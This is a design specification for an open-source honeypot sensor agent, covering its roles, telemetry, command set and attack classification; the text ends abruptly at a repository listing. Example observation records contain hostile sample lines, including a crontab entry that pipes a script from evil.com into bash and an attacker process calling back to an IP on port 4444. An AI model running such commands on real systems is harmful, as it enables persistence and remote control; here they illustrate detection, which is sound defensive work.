# DFI AIO Agent — Specification v2

## Overview

The AIO Agent is DFI's universal infrastructure daemon. One binary, one protocol, one management interface for every node in the DFI ecosystem — honeypot VMs, Proxmox hypervisors, regional relays, and Central itself. It is the primary vehicle for open-source adoption and the foundation of the DFI network.

The agent is an **eye** (sensor) and a **hand** (actuator). All decision-making lives at Central. The agent observes, reports, waits for commands, and executes. It also runs **real-time XGBoost inference** locally, classifying attacks as they happen.

### Design Principles

- **Thin client.** No decision logic, no API keys, no LLM weights inside the VM.
- **Single Go binary.** ~15–20MB, zero runtime dependencies, cross-compiles to Linux/Windows/ARM.
- **Role-based.** Same binary everywhere. Config enables role-appropriate subsystems.
- **Tiered connectivity.** Works standalone (Tier 0) through premium cloud (Tier 3).
- **Open-source core.** Agent + local stack + XGBoost = fully open. CNN + global intelligence = premium.
- **Tagged execution.** Every agent action is tagged for the contamination firewall.

---

## Architecture

### Data Flow — What Changed

The agent **replaces the evidence collector daemon** inside AIO VMs. Labels are generated at Central (or locally in standalone mode), not inside the VM. The VM holds zero persistent state.

**Before (original design):**

```
Network traffic → Hunter → ClickHouse (flows, packets, fingerprints)
Host logs → evidence collector → evidence.db (labels) [inside VM]
evidence.db + ClickHouse → dataset export
```

**After (with agent):**

```
Network traffic → Hunter → ClickHouse (flows, packets, fingerprints)
                              ↑
Host activity → Agent eye → Central → ClickHouse (labels + enriched evidence)
                              ↑
                  Structured observations
                  (timestamped, session-correlated,
                   contamination-tagged)
```

**What was removed from the VM:**

- evidence collector daemon — absorbed by agent eye
- evidence.db (SQLite) — replaced by agent observations → Central → ClickHouse
- Log correlation cron jobs — replaced by agent real-time monitoring
- Labeling scripts — logic moved to Central

### Component Layout

```
┌─────────────────────────────────────────────────────────────┐
│                     DFI Central (Management Network)         │
│                                                              │
│  ┌──────────────┐  ┌──────────────┐  ┌───────────────────┐  │
│  │ Decision      │  │ Fleet State  │  │ Labeling Engine   │  │
│  │ Engine        │  │ Manager      │  │ (replaces         │  │
│  │ (rules + LLM)│  │              │  │  evidence.db)     │  │
│  └──────┬───────┘  └──────┬───────┘  └────────┬──────────┘  │
│         └────────┬────────┘────────────────────┘              │
│                  │                                            │
│         ┌────────▼────────┐                                   │
│         │  NATS (eye)     │   MeshCentral (hand)              │
│         └────────┬────────┘                                   │
└──────────────────┼──────────────────────────────────────────┘
                   │
      ┌────────────┼────────────────────┐
      │            │                    │
┌─────▼─────┐ ┌───▼──────┐ ┌───────────▼──────────┐
│ AIO VM     │ │ AIO VM   │ │ Proxmox Host          │
│            │ │          │ │                       │
│ Agent      │ │ Agent    │ │ Agent (hypervisor)    │
│ (honeypot) │ │(honeypot)│ │ Hunter                │
│            │ │          │ │ ClickHouse            │
│ NO DB      │ │ NO DB    │ │ VM management         │
└────────────┘ └──────────┘ └───────────────────────┘
```

### Dual-Store Roles (unchanged)

| Store | Role | Where |
|---|---|---|
| ClickHouse | Analytical store + source of truth, 90-day TTL | Proxmox host |
| SQLite watchlist.db | Disposable hot cache for Hunter capture depth decisions | Proxmox host |
| Agent local SQLite | Standalone mode only (Tier 0) — observations + local labels | Inside VM/host |

---

## Role-Based Configuration

Same binary, different config. The agent checks its role at startup and enables appropriate subsystems.

### Role: `honeypot` (AIO VMs)

```yaml
role: honeypot
node_id: aio-wp-03
region: us-east
eye:
  auditd: true
  pty_capture: true
  inotify: true
  process_monitor: true
  dns_monitor: true
  credential_tracking: true
  honeypot_detection: true
hand:
  persona_commands: true
  engagement_commands: true
  service_management: true
models:
  xgboost:
    enabled: true
    path: /var/lib/dfi-agent/models/xgb_v1.json
transport:
  nats: nats://regional-relay.us-east:4222
  meshcentral: wss://mesh.us-east:443
```

### Role: `hypervisor` (Proxmox Hosts)

```yaml
role: hypervisor
node_id: pvx-us-east-03
region: us-east
eye:
  auditd: true
  process_monitor: true
  hypervisor_monitor: true
  hunter_monitor: true
  clickhouse_monitor: true
  vm_fleet_monitor: true
  hardware_monitor: true
hand:
  service_management: true
  hypervisor_commands: true
  hunter_commands: true
  clickhouse_commands: true
models:
  xgboost:
    enabled: false               # no direct classification on hypervisor
transport:
  nats: nats://regional-relay.us-east:4222
  meshcentral: wss://mesh.us-east:443
```

### Role: `relay` (Regional Nodes)

```yaml
role: relay
node_id: relay-us-east-01
region: us-east
eye:
  process_monitor: true
  relay_metrics: true
  clickhouse_monitor: true
hand:
  service_management: true
  relay_commands: true
transport:
  nats: nats://localhost:4222
  meshcentral: wss://mesh.us-east:443
```

### Role: `standalone` (Single Machine, No Infrastructure)

```yaml
role: standalone
node_id: auto
local:
  db_path: /var/lib/dfi-agent/observations.db
  retention_days: 30
  dashboard:
    enabled: true
    listen: 127.0.0.1:9740
  alerts:
    enabled: true
    channels: []
  labeler:
    enabled: true
  dataset_export:
    enabled: false
    output_dir: /var/lib/dfi-agent/datasets
    format: [xgb]
eye:
  auditd: true
  pty_capture: true
  inotify: true
  process_monitor: true
  dns_monitor: true
models:
  xgboost:
    enabled: true
    path: /var/lib/dfi-agent/models/xgb_starter.json
```

---

## Tiered Connectivity

The agent operates at four tiers. Each is a superset of the previous.

```
Tier 0: Standalone
    Agent runs alone on one machine.
    Local SQLite for observations.
    Local XGBoost classification, labeling, alerting, dashboard.
    Zero network dependencies.

Tier 1: Self-Hosted Fleet
    Multiple agents report to user's own Central (open-source).
    Cross-machine correlation, centralized dashboard.
    User's own ClickHouse for analytics.
    No connection to DFI network.

Tier 2: DFI Community Network
    Agent connects to DFI's public relay.
    Contributes anonymized observations upstream.
    Receives community blocklist + basic threat intel.
    Free — data contribution is the payment.

Tier 3: DFI Premium
    Receives production XGBoost models (global training data).
    Receives CNN models (encrypted edge delivery, proprietary).
    XGBoost + CNN ensemble classification.
    Full C2 feeds, CVE exploitation tracking, expert analysis.
    Paid subscription.
```

### Tier Upgrade Path

```yaml
# Tier 0 → Tier 1: add central block
central:
  url: https://your-central.example.com:9741
  token: your-fleet-token

# Tier 1 → Tier 2: add community block
community:
  enabled: true
  relay: wss://community.dfi.dev/relay
  contribute: true
  receive_blocklist: true

# Tier 2 → Tier 3: add premium block
premium:
  api_key: dfi_pk_a1b2c3...
  endpoint: https://api.dfi.dev/v1
  features:
    expert_xgb: true
    cnn: true
    ensemble: true
    global_freq: true
  inference_mode: edge
  model_cache: /var/lib/dfi-agent/models/premium/
  auto_update: true
```

---

## Communication Protocol

### Transport Split (Critical for Scale)

| Channel | Purpose | Protocol | Scale Limit |
|---|---|---|---|
| **NATS** | Eye observations (high-frequency telemetry) | Pub/sub to regional relay | 10M+ msg/sec per relay |
| **MeshCentral** | Hand commands (admin, troubleshooting, file ops) | WebSocket via MC agent | 2–5K agents per MC instance |

At Tier 0 standalone, neither is required — the agent writes to local SQLite.
At Tier 1+, NATS carries the observation pipeline; MeshCentral carries admin commands.

### Message Formats

**Upstream (agent → Central):**

```json
{
  "msg_type": "observation" | "command_result" | "heartbeat" | "alert" | "prediction",
  "vm_id": "aio-wp-03",
  "timestamp": "2026-02-28T16:41:58.332Z",
  "payload": { ... }
}
```

**Downstream (Central → agent):**

```json
{
  "msg_type": "command",
  "command_id": "a3f8-...",
  "cmd": "health_check" | "exec" | "file_ops" | ...,
  "params": { ... },
  "tag": "ops" | "persona_maintenance" | "honeypot_breadcrumb" | "diagnostic",
  "priority": "normal" | "immediate"
}
```

### Batching & Priority

| Condition | Report Frequency |
|---|---|
| Idle (no external sessions) | Every 30–60 seconds (heartbeat only) |
| Active engagement | Every 2–5 seconds |
| Priority event | Immediate, bypasses batch timer |

**Priority triggers (immediate report):** auth success, outbound connection, privilege escalation, sensitive file write, post-exploitation tool execution, attacker killing monitoring, breadcrumb consumed.

---

## Eye — Sensor Subsystem

### Data Sources

| Source | Mechanism | Roles |
|---|---|---|
| **auditd** | `audisp` plugin or log tail | honeypot, hypervisor, standalone |
| **journald** | `journalctl --follow` | all roles |
| **inotify** | Watch sensitive file paths | honeypot, standalone |
| **/proc** | Periodic poll + event-triggered | all roles |
| **utmp/wtmp** | Login/logout tracking | honeypot, standalone |
| **Network sockets** | `/proc/net/tcp`, conntrack | honeypot, standalone |
| **PTY capture** | `/dev/pts/*` kernel hooks | honeypot only |
| **DNS queries** | Per-process resolver monitoring | honeypot, standalone |
| **Hunter metrics** | Hunter process stats, capture rate | hypervisor only |
| **ClickHouse metrics** | CH system tables | hypervisor, relay |
| **VM fleet status** | Proxmox API / `qm` commands | hypervisor only |
| **Hardware health** | SMART, sensors, IPMI, ZFS | hypervisor only |
| **NATS metrics** | Throughput, queue depth | relay only |

### Observation Types — Full Taxonomy

| Type | Fields | Evidence Value |
|---|---|---|
| `login` | user, method, source_ip, session_id | Session start, attribution |
| `logout` | user, session_id, duration_sec | Session end |
| `command` | session_id, user, cmd, args, cwd, pid, parent_pid | Behavioral sequencing |
| `file_access` | path, operation, user, process, pid | Recon patterns |
| `file_write` | path, size_bytes, sha256, creator_process | Tool drops, webshells |
| `file_delete` | path, process, pid | Cleanup behavior |
| `file_modify` | path, diff_summary, process, pid | Config tampering |
| `process_exec` | cmd, args, pid, parent_pid, user | Kill-chain progression |
| `network_connection` | direction, proto, dst_ip, dst_port, process | C2, lateral movement |
| `network_listen` | proto, port, process, pid | Backdoor listeners |
| `dns_query` | qname, qtype, response, process, pid | C2 domain discovery |
| `privilege_change` | from_user, to_user, method, pid | Privesc tracking |
| `cron_modify` | action, schedule, command, user | Persistence |
| `memory_capture` | pid, process_name, maps, cmdline, environ | In-memory tool analysis |
| `pty_stream` | session_id, direction, data_b64 | Full terminal capture |
| `breadcrumb_consumed` | breadcrumb_id, credential_type, target_vm | Lateral movement tracking |
| `honeypot_detection` | method, tool_name, indicators | Anti-deception awareness |
| `model_prediction` | flow_id, xgb_result, confidence, features | Real-time classification |
| `hunter_metrics` | capture_rate, drop_rate, queue_depth | Hypervisor role |
| `clickhouse_metrics` | disk, inserts/sec, merge_queue | Hypervisor/relay role |
| `vm_fleet_status` | per-VM cpu/mem/agent_status | Hypervisor role |
| `host_hardware` | cpu_temp, disk_smart, network, zfs | Hypervisor role |

### Filtering Rules

**Include:** events from external sessions, new network listeners/outbound connections, file modifications in monitored paths, privilege changes, kernel module loads.

**Exclude:** events from MeshCentral agent, events tagged with agent's own execution signature, routine system events (logrotate, systemd timers, persona-scheduled crons).

**Deduplication:** Rapid repeated identical events collapsed with `repeat_count`. File access events within 100ms of same process/path merged.

---

## Hand — Actuator Subsystem

### Command Taxonomy — All Roles

#### System Diagnostics (all roles)

| Command | Returns |
|---|---|
| `health_check` | CPU, memory, disk, uptime, load, swap, open FDs, zombie procs, agent version |
| `service_status` | Per-service running/stopped, PID, memory, restart count |
| `disk_usage` | Per-path total/used/available, inode usage |
| `network_state` | Interfaces, IPs, connections, listeners, firewall, routing |
| `process_list` | Full process tree, optional filter (all, external, attacker_tree) |
| `journal_tail` | Structured log entries by unit |
| `diagnose` | Issue-specific diagnostic bundle (service_crash, disk_full, network, performance) |
| `capture_state` | Complete system state snapshot |
| `trace_process` | strace/ltrace on target PID for N seconds |
| `log_bundle` | Collected + compressed logs via MeshCentral file transfer |

#### System Administration (all roles)

| Command | Action |
|---|---|
| `service_action` | start/stop/restart/reload/enable/disable systemd units |
| `package_action` | install/upgrade/remove packages |
| `config_write` | Write config with backup, validation, conditional service reload, auto-rollback on failure |
| `file_ops` | read/write/delete files with owner/mode/backdate support |
| `user_manage` | add/remove/modify system users |
| `cron_manage` | add/remove/list cron entries |
| `firewall_rule` | add/remove/list iptables rules |
| `exec` | Raw shell execution (typed commands preferred for auditability) |

#### Honeypot — Persona & Engagement (honeypot role only)

| Command | Action |
|---|---|
| `simulate_login` | Create real PTY session as persona user with human-realistic timing |
| `credential_stage` | Temporarily allow specific credential to succeed, auto-revert |
| `service_deploy` | Start additional service on demand (Redis, FTP, etc.) with seed data |
| `vuln_deploy` | Install real vulnerable component, optional auto-revert timer |
| `outbound_policy` | Allow/block/capture outbound attacker connections per IP:port |
| `baseline_snapshot` | Hash manifest of all monitored paths |
| `integrity_check` | Compare current state against baseline, report diffs |
| `memory_dump` | Capture /proc/pid artifacts for attacker processes |
| `file_capture` | Read file content + SHA-256 + metadata for attacker-created files |

#### Hypervisor (hypervisor role only)

| Command | Action |
|---|---|
| `vm_action` | snapshot/rollback/stop/start/restart/migrate VMs |
| `vm_clone` | Clone from template with network config |
| `vm_destroy` | Destroy VM with confirmation + optional disk purge |
| `hunter_action` | start/stop/restart Hunter |
| `hunter_config` | Update Hunter parameters (capture depth, BPF filter, buffer size) |
| `hunter_focus` | Set per-IP capture depth override with duration and model context |
| `hunter_stats` | Detailed Hunter performance report |
| `clickhouse_action` | optimize/drop_partition/backup ClickHouse tables |
| `clickhouse_query` | Execute read-only diagnostic query |
| `proxmox_network` | Create/modify bridges and VLANs |
| `proxmox_storage` | Storage pool status |
| `proxmox_firewall` | Add/remove host-level firewall rules |

---

## ML Integration — XGBoost Open, CNN Closed

### The Strategic Split

**XGBoost is open-source.** Pure Go inference, ~2MB model file, microsecond evaluation, zero dependencies. Ships with starter model. Full training pipeline published. Every split has a physical interpretation. Handles ~85% of classifications well.

**CNN is proprietary.** Encrypted model files delivered to premium subscribers. Decrypted in memory at runtime, never plaintext on disk. Subscription-keyed — lapsed subscription = fallback to XGBoost only. Catches sequential patterns XGBoost misses: mid-flow transitions, tool-specific cadence, behavioral phase changes.

### What Ships Open-Source

- XGBoost inference engine (pure Go, no dependencies)
- XGBoost feature computation (all 75 features, exact match to training pipeline)
- Starter XGBoost model (trained on public/sample data)
- XGBoost training pipeline (Python — users train on their own data)
- XGBoost model format specification
- Feature accumulator (real-time feature vector construction)
- Basic frequency tables for F7 fingerprint features
- Model performance self-monitoring
- Model-driven capture depth decisions
- Prediction → evidence feedback loop
- CNN dataset specification (data format only — column definitions, binning rules)

### What Remains Proprietary

- CNN inference engine (ONNX runtime integration or native Go evaluator)
- CNN sequence builder (4-channel × 128-position token construction)
- CNN model weights (trained .onnx blob)
- CNN training pipeline (PyTorch code, augmentation, hyperparameters)
- Ensemble logic (XGBoost + CNN combination strategy)
- Production XGBoost models (same format, trained on global fleet data)
- Global frequency tables (100K+ entries, daily-updated)
- Premium model delivery infrastructure (encryption, signing, subscription keys)

### Feature Computation Engine

The agent maintains a per-flow feature accumulator that produces **identical** output to the ClickHouse export views. Training/inference parity is a critical testing requirement.

```
Per-flow Feature Accumulator
├── Identity: flow_id, session_key, src_ip, dst_ip, ports, proto
├── Counters (updated per packet):
│   pkts_fwd/rev, bytes_fwd/rev, syn/fin/rst/psh/ack counts
├── Timing (stabilizes after ~20 packets):
│   rtt_ms, iat_fwd_mean/std, think_time_mean/std, iat_to_rtt, pps, bps
├── Size distribution (stabilizes after ~30 packets):
│   fwd_size mean/std/min/max, histogram bins, frac_full
├── Payload content (available after first payload):
│   entropy_first, printable_frac, null_frac, byte_std
├── Fingerprints (set once, early in flow):
│   ja3_hash→freq, hassh_hash→freq, http_ua→freq, tls/ssh/http/dns fields
├── Source context (from local history):
│   src_flow_count, src_unique_ports/protos/dsts, src_span_min, src_avg_pps
│
├── .update(packet) → update all accumulators
├── .to_xgb_vector() → [75 floats], handles NaN correctly
└── .confidence() → how complete the features are (0.0–1.0)
```

### Frequency Tables

F7 fingerprint features use frequency encoding. The agent needs lookup tables:

| Tier | Source | Size | Update |
|---|---|---|---|
| Open-source (starter) | Bundled with agent release | ~10K entries per hash type | Per agent release (quarterly) |
| Self-trained | Computed from agent's local history | Varies | Continuous |
| Premium | Downloaded from DFI API | ~100K+ entries | Daily |

Unknown hashes get frequency 0 — itself a strong signal (never-before-seen fingerprint → likely custom tool).

### Real-Time Classification Pipeline

```
Flow starts → packets arrive → accumulator updates
    │
    ├── After ~5 packets: fast-path check
    │   SYN-only, no response → RECON (skip full inference)
    │   Port not in service list → RECON (high confidence)
    │
    ├── After ~20 packets: XGBoost inference
    │   ≥ 0.90 confidence → accept, trigger actions
    │   0.70–0.90 → tentative, continue accumulating
    │   < 0.70 → uncertain, wait for more data
    │
    ├── After ~50 packets: XGBoost re-inference (features more stable)
    │   Confidence should improve with better timing/size stats
    │
    ├── [Premium only] After ~30 packets: CNN inference in parallel
    │   CNN provides second opinion from sequence patterns
    │   Ensemble: agreement → high confidence; disagreement → flag for review
    │
    ├── [Premium only] After 128 packets: CNN sequence complete
    │   Final CNN inference → definitive sequence classification
    │
    └── Flow ends: final XGBoost inference with complete features
        Write prediction to local store + send to Central
```

### Model Predictions as Observations

Predictions are first-class events in the pipeline:

```json
{
  "type": "model_prediction",
  "flow_id": "flow-abc-123",
  "timestamp": "2026-02-28T16:42:05.000Z",
  "src_ip": "185.220.101.34",
  "dst_port": 22,
  "models": {
    "xgboost": {
      "version": "2026.02.15",
      "prediction": 2,
      "label_name": "BRUTEFORCE",
      "confidence": 0.94,
      "probabilities": [0.01, 0.02, 0.94, 0.02, 0.01],
      "feature_completeness": 0.85,
      "packets_seen": 45,
      "top_features": [
        {"name": "psh_count", "value": 23, "importance": 0.18},
        {"name": "iat_to_rtt", "value": 1.2, "importance": 0.15}
      ]
    }
  },
  "prediction_number": 3,
  "previous_predictions": [
    {"at_packets": 10, "prediction": 0, "label": "RECON", "confidence": 0.65},
    {"at_packets": 25, "prediction": 2, "label": "BRUTEFORCE", "confidence": 0.82}
  ]
}
```

### Model-Driven Capture Depth

XGBoost predictions feed back into Hunter's D0–D3 system:

| XGBoost Prediction | Capture Depth Action |
|---|---|
| RECON (≥0.90) | Stay at D1 — known scanner |
| BRUTEFORCE (≥0.85) | Upgrade to D2 — capture packet tokens |
| EXPLOIT (≥0.70) | Upgrade to D3 — full payload capture |
| Uncertain (<0.70) | Upgrade to D2 — collect more data |
| Returning IP, previously COMPROMISE | Immediately D3 — high-value attacker |

The honeypot agent sends predictions to Central. Central tells the Proxmox host agent to adjust Hunter's capture depth for that source IP:

```json
{"cmd": "hunter_focus",
 "source_ip": "185.220.101.34",
 "capture_depth": "D3",
 "duration_sec": 3600,
 "reason": "model_prediction",
 "model_context": {
   "xgb_prediction": "EXPLOIT",
   "xgb_confidence": 0.88,
   "vm_source": "aio-wp-03"
 }}
```

### Prediction → Evidence Feedback Loop

```
XGBoost predicts BRUTEFORCE (0.85)
    │
    ├── Eye observes 47 auth failures
    │   Evidence confirms BRUTEFORCE → label confidence 0.98
    │   → High-confidence training sample
    │
    ├── Eye observes auth success → wget → chmod +x
    │   Evidence says COMPROMISE, model said BRUTEFORCE
    │   → Correction sample (gold for retraining)
    │   → Flagged: "XGB misclassified brute→compromise transition"
    │
    └── Eye observes nothing (no host evidence)
        → Label confidence 0.85 (model-only)
        → Lower-weight training sample
```

Correction samples (model wrong, evidence right) are the most valuable for model improvement. The agent generates targeted retraining data automatically.

### Model Performance Self-Monitoring

```json
{
  "type": "model_performance",
  "period": "2026-02-28",
  "xgboost": {
    "version": "2026.02.15",
    "predictions_today": 4521,
    "confirmed_by_evidence": 3102,
    "contradicted_by_evidence": 89,
    "accuracy_where_confirmed": 0.972,
    "per_class": {
      "RECON": {"predicted": 2100, "confirmed": 1890, "wrong": 12},
      "BRUTEFORCE": {"predicted": 1200, "confirmed": 620, "wrong": 45},
      "EXPLOIT": {"predicted": 350, "confirmed": 72, "wrong": 14},
      "COMPROMISE": {"predicted": 71, "confirmed": 10, "wrong": 3}
    },
    "confusion_pairs": [
      {"predicted": "BRUTEFORCE", "actual": "EXPLOIT", "count": 23}
    ]
  }
}
```

### Model Update Pipeline

| Tier | Update Source | Frequency | Mechanism |
|---|---|---|---|
| Open-source starter | Bundled with agent release | Quarterly | `apt upgrade dfi-agent` |
| Self-trained | User trains from own data | On demand | `dfi-train xgb --input data.csv --output model.json` |
| Premium XGBoost | Downloaded from DFI API | Weekly | Auto-update, checksum-verified, hot-swap |
| Premium CNN | Downloaded from DFI API | Weekly | Encrypted blob, subscription-keyed decryption, in-memory only |

**Premium model delivery (CNN):**

```
DFI API → encrypted model blob → agent downloads
→ agent validates signature (DFI public key)
→ agent decrypts with subscription-derived key
→ model weights live only in memory (never plaintext on disk)
→ inference runs locally, data never leaves the box
→ on subscription expiry, key rotation fails → fallback to XGBoost only
```

### What XGBoost Handles vs What CNN Adds

**XGBoost handles well (scalar features sufficient):**

- Port scanning (src_unique_ports, conn_state)
- SSH/RDP brute-force (psh_count, iat_to_rtt, think_time)
- Banner grabbing (conn_state=1, pkts_fwd<5)
- Bulk exfiltration (byte_ratio, frac_full, entropy)
- Known tool fingerprints (ja3_freq, hassh_freq)

**CNN catches what XGBoost misses (sequential patterns needed):**

- Brute-force succeeding mid-flow (transition visible in sequence)
- Interactive human switching tools (tempo change in IAT channel)
- Multi-stage attacks in single session (phase shifts visible in size+flags)
- Tool identification by packet cadence (nmap vs masscan vs zmap)
- Exfiltration hidden in normal traffic (intermittent bulk responses)

### Premium Trial Mode

14-day trial: CNN runs alongside XGBoost. Dashboard shows side-by-side comparison. At trial end, agent generates conversion report: "CNN improved accuracy by X% and caught Y incidents XGBoost missed."

---

## Evidence Collection — Deep Capabilities

### Application-Layer Payload Capture

| Service | Method | Data Captured |
|---|---|---|
| HTTP | Apache/Nginx request body hook | Full POST body (exploit payloads, webshells, SQLi) |
| SSH | PTY stream capture | Complete terminal session byte-for-byte |
| MySQL/MSSQL | Query log + network stream | Attacker SQL commands, exfiltrated data |
| Redis | Command log | All attacker commands and retrieved data |
| SMB | Audit log + packet capture | File access, share enumeration |

### Memory Forensics

When the eye detects a suspicious process (attacker-spawned, deleted executable):

```json
{
  "type": "memory_capture",
  "pid": 4850,
  "process_name": ".x",
  "cmdline": "/tmp/.x -c 45.33.22.11:4444",
  "exe_path": "/tmp/.x (deleted)",
  "exe_sha256": "a1b2c3...",
  "maps_summary": {"heap_size_kb": 2048, "shared_libs": ["libc.so.6"]},
  "open_fds": [{"fd": 3, "type": "socket", "dst": "45.33.22.11:4444"}]
}
```

### File Integrity Diff

Agent maintains baseline hash manifest from persona deployment. Changes reported as structured diffs:

```json
{
  "type": "file_modify",
  "path": "/etc/crontab",
  "baseline_sha256": "original...",
  "current_sha256": "new...",
  "diff_summary": "+* * * * * root curl http://evil.com/bot.sh | bash",
  "process": "vi", "pid": 4860
}
```

### Credential Breadcrumb Tracking

Every planted credential gets a `breadcrumb_id`. Consumption triggers cross-VM correlation:

```json
{
  "type": "breadcrumb_consumed",
  "breadcrumb_id": "bc-ssh-config-dbprod01",
  "credential_type": "ssh_key",
  "planted_path": "/home/kevin/.ssh/config",
  "consumed_at": "2026-02-28T16:43:10.887Z",
  "consumer_ip": "185.220.101.34",
  "target_vm": "aio-db-01",
  "success": true
}
```

---

## Attacker Fingerprinting — Host-Side

### Tool Identification

| Signal | Method | Differentiates |
|---|---|---|
| Syscall sequence | auditd / eBPF | Cobalt Strike vs Metasploit vs custom RAT |
| File access order | inotify + audit | Different recon scripts |
| Library loads | `/proc/pid/maps` | Static vs dynamic linked tools |
| Environment probing | Command sequence | VM/honeypot detection attempts |

### Shell Behavior Profiling

First-60-seconds command sequences are highly distinctive:

- **Automated scanner:** `id; whoami; uname -a` (sub-second, fixed order)
- **Manual operator:** `ls` → pause → `whoami` → long pause (variable timing)
- **Botnet dropper:** `cd /tmp; wget ...; chmod +x` (direct to payload)
- **Sophisticated operator:** `systemd-detect-virt; cat /sys/class/dmi/id/product_name` (honeypot checks first)

### Honeypot Detection Tracking

Agent watches for anti-honeypot checks: virtualization detection, known honeypot artifact checks, connectivity tests, environment realism checks, filesystem timestamp analysis. Reported to Central for persona improvement.

---

## Hypervisor-Specific Capabilities

### Hunter Health & Performance

```json
{
  "type": "hunter_metrics",
  "node_id": "pvx-us-east-03",
  "hunter_pid": 1823,
  "packets_captured_sec": 2340000,
  "packets_dropped_sec": 12,
  "drop_rate_pct": 0.0005,
  "flows_assembled_sec": 98400,
  "clickhouse_write_queue": 24000,
  "clickhouse_write_latency_ms": 45,
  "ring_buffer_usage_pct": 22,
  "capture_depth_distribution": {"D0": 42000, "D1": 38000, "D2": 15000, "D3": 3400}
}
```

### ClickHouse Monitoring

```json
{
  "type": "clickhouse_metrics",
  "disk_usage_pct": 72,
  "rows_inserted_sec": 3200000,
  "merge_queue_depth": 14,
  "tables": {
    "flows": {"rows": 892000000, "disk_gb": 134, "compression_ratio": 18.2},
    "packets": {"rows": 26800000000, "disk_gb": 890, "compression_ratio": 22.1}
  }
}
```

### VM Fleet Monitoring

```json
{
  "type": "vm_fleet_status",
  "host_cpu_pct": 62,
  "host_memory_used_gb": 98,
  "vms": [
    {"vmid": 100, "name": "aio-wp-03", "status": "running",
     "cpu_pct": 8.2, "agent_status": "connected", "active_engagements": 1}
  ]
}
```

### Host Hardware Health

Disk SMART status, CPU temperature, network interface errors, ZFS pool health, PSU status. Early warning for hardware failures.

### VM Lifecycle Management

Central can automatically:

- **Post-engagement rollback:** snapshot compromised state (forensics) → rollback to clean baseline
- **Dynamic fleet scaling:** clone additional VMs from templates during heavy traffic, destroy when subsided
- **Load-based migration:** move idle VMs from overloaded hosts to underloaded ones
- **Automatic recovery:** VM agent goes dark → Proxmox agent snapshots → hard-restart VM

---

## Cross-VM Coordination

### Lateral Movement Tracking

```
Attacker compromises VM-A
→ Agent-A reports breadcrumb consumed, target=VM-B
→ Central alerts Agent-B: "expect incoming from attacker profile X"
→ Agent-B heightens reporting frequency
→ Attacker SSHs from VM-A to VM-B
→ Central links both sessions under same tracking ID
→ Both agents' data feeds lateral movement model
```

### Persona Consistency

Central maintains persona graph — which VMs reference which. Breadcrumb updates propagate consistency checks to all referenced VMs.

### Distributed Canary Tokens

Unique credentials across multiple VMs, each authenticating against specific services. Precise attribution of which host was source of credential theft.

### Fleet-Wide Vulnerability Rotation

Central rotates which VMs expose which vulnerable components on a schedule. Agents handle deployment and teardown. Maximizes dataset diversity per CVE.

---

## Enriched Labels Schema

Labels generated at Central with agent observations are richer than original evidence.db:

```sql
CREATE TABLE dfi.labels
(
    flow_id                  String,
    label                    UInt8,
    label_confidence         Float32,
    evidence_mask            UInt16,        -- expanded from UInt8
    evidence_detail          String,
    agent_observation_count  UInt16,
    kill_chain_depth         UInt8,
    engagement_id            String,
    breadcrumbs_consumed     UInt8,
    lateral_movement         UInt8,
    attacker_tool_hash       Nullable(String),
    honeypot_detected        UInt8,
    labeled_at               DateTime DEFAULT now()
)
ENGINE = ReplacingMergeTree(labeled_at)
ORDER BY flow_id;
```

**Expanded evidence_mask (UInt16):**

| Bit | Signal | Source |
|---|---|---|
| 0 | auth_failure | Agent eye |
| 1 | auth_success | Agent eye |
| 2 | process_create | Agent eye |
| 3 | service_install | Agent eye |
| 4 | suspicious_command | Agent eye |
| 5 | file_download | Agent eye |
| 6 | privilege_escalation | Agent eye |
| 7 | lateral_movement | Agent eye + cross-VM correlation |
| 8 | outbound_c2 | Agent eye |
| 9 | credential_theft | Agent eye (breadcrumb consumed) |
| 10 | persistence_mechanism | Agent eye (cron/systemd modified) |
| 11 | data_exfiltration | Agent eye |
| 12 | tool_deployment | Agent eye (downloaded + executed) |
| 13 | evasion_attempt | Agent eye (disabled monitoring) |
| 14 | memory_only_tool | Agent eye (deleted executable) |
| 15 | dns_tunneling | Agent eye |

---

## Threat Intelligence Extraction

The agent fleet produces raw material for commercial products:

| Product | Agent Source |
|---|---|
| C2 Infrastructure Feed | Outbound connections from attacker processes |
| Time-to-Exploitation Tracking | First observation timestamp per CVE exploit |
| TTP → MITRE ATT&CK Mapping | Observation types auto-tagged with ATT&CK IDs |
| Malware Sample Repository | Captured tool downloads (SHA-256 + behavioral context) |
| Tool Evolution Tracking | Longitudinal tool behavioral changes across fleet |

---

## Data Quality Feedback Loop

| Current Method | Agent Enhancement | Confidence Impact |
|---|---|---|
| Regex "Failed password" in auth.log | Direct observation with session context | 0.7 → 0.95 |
| Suspicious command in syslog | Full command with args, pid chain, file changes | 0.6 → 0.95 |
| Auth success + process create | Login → command → file → outbound chain | 0.7 → 0.98 |

**Novel behavior flagging:** Agent detects activity outside current label taxonomy. Central queues for human review. Confirmed novel techniques expand labels and enrich dataset.

---

## Open-Source Community Architecture

### Installation

```bash
# One-liner install
curl -fsSL https://get.dfi.dev | bash
# Binary + systemd unit + starter model + local dashboard at localhost:9740

# Docker
docker run -d --name dfi-agent --net=host --pid=host --privileged \
  ghcr.io/dfi-project/agent:latest

# From source
git clone https://github.com/dfi-project/agent && cd agent && make && sudo make install
```

### Local Dashboard (Tier 0)

Built-in web UI at `http://localhost:9740` showing:

- Active sessions with kill-chain stage
- Kill-chain distribution over time
- Recent activity feed
- Top attacker IPs
- Model performance metrics
- Non-blocking premium information panel

### Self-Hosted Central (Tier 1)

```bash
curl -fsSL https://get.dfi.dev/central | bash
# Installs Central brain + ClickHouse + web dashboard
# Generates fleet token for agent enrollment
```

Provides: fleet dashboard, cross-machine correlation, centralized alerting, ClickHouse analytics, dataset export.

Does not provide: global intelligence, production models, LLM personas, cross-org correlation.

### Community Contribution Protocol (Tier 2)

**Contributed (anonymized):** attacker IP, target service/port, kill-chain stage, duration, tools detected, C2 destinations, fingerprints, flow features (no target IP), coarse node region.

**Never contributed:** target IP (user's real IP), hostname, file contents, credentials, internal topology, anything marked private.

**Received:** community blocklist (IPs flagged by 3+ nodes), basic threat summaries, matching alerts.

### Plugin / Extension API

**Custom Eye plugins:** monitor application-specific logs (WordPress, Docker, custom services).

```python
from dfi_agent.plugin import EyePlugin, Observation

class WordPressMonitor(EyePlugin):
    name = "wordpress_monitor"
    def setup(self):
        self.watch_file("/var/log/apache2/access.log")
    def on_line(self, line):
        if self.detect_sqli(line):
            self.emit(Observation(type="service_interaction", ...))
```

**Custom Hand plugins:** manage application-specific components.

**Custom labeling rules:** extend kill-chain classifier with domain-specific patterns.

### Repository Structure

```
github.com/dfi-project/
